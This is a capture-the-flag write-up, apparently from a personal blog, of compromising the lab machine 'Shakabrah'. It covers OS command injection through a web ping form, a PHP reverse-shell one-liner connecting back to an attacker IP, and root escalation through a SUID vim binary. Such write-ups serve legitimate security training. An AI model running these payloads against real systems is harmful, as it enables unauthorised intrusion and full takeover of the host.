---
layout: default
title : muzec - Shakabrah Writeup
---



### Enumeration With Nmap

We always start with an nmap scan.....

```Nmap -sC -sV -oA nmap <Target-IP>```


```
┌──(muzec㉿Muzec-Security)-[~/Documents/PG/sha]
└─$ nmap -sC -sV -oA nmap 192.168.144.86
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-23 14:02 WAT
Nmap scan report for 192.168.144.86
Host is up (0.27s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:b9:6d:35:0b:c5:c4:5a:86:e0:26:10:95:48:77:82 (RSA)
|   256 a8:0f:a7:73:83:02:c1:97:8c:25:ba:fe:a5:11:5f:74 (ECDSA)
|_  256 fc:e9:9f:fe:f9:e0:4d:2d:76:ee:ca:da:af:c3:39:9e (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.11 seconds
```

### Web Enumeration On Port 80

Since HTTP is open which is port 80 let vist it on our browser we can see a page which allow us to ping a host like a `localhost` so i try pinging to see what we have on the web page.

![image](https://user-images.githubusercontent.com/69868171/126810931-aefc3bde-bdfe-4168-8506-7ad759284a86.png)


```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.035 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.050 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.039 ms
64 bytes from 127.0.0.1: icmp_seq=4 ttl=64 time=0.046 ms

--- 127.0.0.1 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3077ms
rtt min/avg/max/mdev = 0.035/0.042/0.050/0.008 ms
```

### Exploitation Os Command Injection On The Page Form

Let try to verify this by attempting to run the id command using the following payload: `| id` .

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Boom we have command injection now let try to get a reverse shell back to us.

```
┌──(muzec㉿Muzec-Security)-[~/Documents/PG/sha]
└─$ sudo nc -nvlp 80
[sudo] password for muzec: 
listening on [any] 80 ...
```

Now our payload.

```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

![image](https://user-images.githubusercontent.com/69868171/126811641-90036778-f5bb-4712-88da-b1be048bb0ca.png)

We have shell now let spawn a TTY shell.

```
python3 -c 'import pty; pty.spawn ("/bin/bash")'
```

```
www-data@shakabrah:/var/www/html$ uname -a;id;whoami
uname -a;id;whoami
Linux shakabrah 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data
www-data@shakabrah:/var/www/html$ 
```

### SUID Privilege Escaltion

```
find / -perm -u=s -type f 2>/dev/null
```

SUID Binaries

```
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/traceroute6.iputils
/usr/bin/at
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newgidmap
/usr/bin/vim.basic
/usr/bin/newuidmap
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/bin/umount
/bin/fusermount
/bin/ping
/bin/mount
/bin/su
```

We can see `/usr/bin/vim.basic` so that our way to root let exploit it.

```
/usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/bash", "bash", "-pc", "reset; exec bash -p")'
```

![image](https://user-images.githubusercontent.com/69868171/126812515-2ab4c5ae-7bcd-4e6e-b84b-a80caaa8b035.png)

We came accross some few error with vim asking for terminal type now let gp back to our main machine to check our terminal type.

```
echo $TERM
```

![image](https://user-images.githubusercontent.com/69868171/126812647-7acfef0e-2e9e-4aa2-8776-c4faaf488cd7.png)

So it `screen` now let go back to the target.

![image](https://user-images.githubusercontent.com/69868171/126812926-4add5916-c6fb-4016-ac02-5376fc2bb5f5.png)


We are root and done.

Greeting From [Muzec](https://twitter.com/muzec_saminu)

<br> <br>
[Back To Home](../index.md)
<br>
